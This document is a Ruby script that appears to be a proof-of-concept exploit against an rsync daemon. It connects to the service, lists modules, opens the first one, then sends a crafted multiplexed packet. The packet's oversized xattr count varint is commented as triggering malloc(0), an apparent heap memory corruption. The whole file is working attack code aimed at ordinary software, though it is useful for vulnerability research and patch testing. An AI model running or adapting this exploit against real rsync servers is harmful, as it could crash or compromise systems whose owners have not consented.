#!/usr/bin/ruby

require 'socket'

def msg(fd, str)
   fd.write(str)
end

def e_msg(str)
   msg($stdout, "[-] #{str}\n")
end

def s_msg(str)
   msg($stderr, "[+] #{str}\n")
end

def debug_halt
   s_msg("PRESS ANY RETURN TO CONTINUE..")
   $stdin.readline
end

def to_varint(x)
   ch = 0xf7 # extra -> 4 bit -> 16 - 0xf7 keeps the sign bit and pass 4 byte count
   [ch].pack('C') + [x].pack('V')
end

if __FILE__ == $0
   host = "127.0.0.1"
   port = 873

   s_msg("Connecting to #{host}:#{port}")

   sock = TCPSocket.new(host, port)

   # Initial handshake & motd
   data = sock.recv(65535)
   data = data.split('\n')[0]
   if data !~ /^@RSYNCD: ([0-9.]+)/
      e_msg("Error in protocol")
      exit
   end
   
   proto_ver = $1.to_s
   s_msg("RSYNC protocol ver: #{proto_ver}")

   #debug_halt()

   sock.send("@RSYNCD: #{proto_ver}\n", 100)
   sock.send("#list\n", 100)
   
   files = []
   while true
      line = sock.readline
      
      break if ((line =~ /^@RSYNCD: EXIT/) or (line.to_s.empty?))
      set = line.split("\t", 2)
      files << {:name => set[0].to_s.strip, :desc => set[1].to_s.strip}
   end

   s_msg("Remote directories:")
   files.each {|f|
      s_msg("\t#{f[:name]}\t#{f[:desc]}")
   }

   sock.shutdown
   sock.close

   if files.empty?
      e_msg("No directory to use")
      exit
   end

   s_msg("Using directory: %s" % files[0][:name])

   sock = TCPSocket.new(host, port)

   data = sock.recv(65535)
   data = data.split('\n')[0]
   if data !~ /^@RSYNCD: ([0-9.]+)/
      e_msg("Error in protocol")
      exit
   end

   debug_halt()

   sock.send("@RSYNCD: #{proto_ver}\n", 100)
   sock.send("#{files[0][:name]}\n", 100)
   data = sock.readline
   if data.to_s !~ /^@RSYNCD: OK/
      e_msg("Cannot change directory")
      exit
   end
   
   # if flags & RL_EOL_NULLS in read_line()
   sock.send("--server\x00", 100)
   1.times { sock.send("AAAAAAA\x00", 100) }
   sock.send(".\x00", 100)

   # empty read_readline()
   sock.send("\x00", 100)
   puts sock.recv(65535)
   
   debug_halt()

   # Inside recv file list
   # recv_file_list() calls readfd to read 1 byte
   # which in turn calls readfd_unbuffered which reads atleast
   # 4 bytes of data, determines the MSG type from it and then
   # does further reading

   # [tag:1byte#msg_bytes:3byte] - Total: 4byte
   # msg_type = tag - MPLEX_BASE (7)
   msg_bytes = 0x1000
   msg_tag = 0
   val = ((msg_tag + 7) << 24) | (msg_bytes & 0x00FFFFFF)
   val = [val].pack('V')

   sock.send(val, val.length)

   # Payload
   data = String.new
   1.upto(0x1000) {|i| data << [i & 0xFF].pack('C')}
   data[0x10 - 1,1] = "\x00" # ndx
   data[0x11 - 1,5] = to_varint(1 << 30) # count, this triggers malloc(0)
   #data[0x11 - 1,5] = to_varint(1) # count, this triggers malloc(0)
   data[0x16 - 1,1] = "\x06"
   data[0x18 - 1,6] = "user.A"
   data[0x35 - 1,1] = "\x06"
   data[0x37 - 1,6] = "user.A"
   
   s_msg("Sending payload of size: #{data.length}")
   sock.send(data, data.length)

   debug_halt()
end
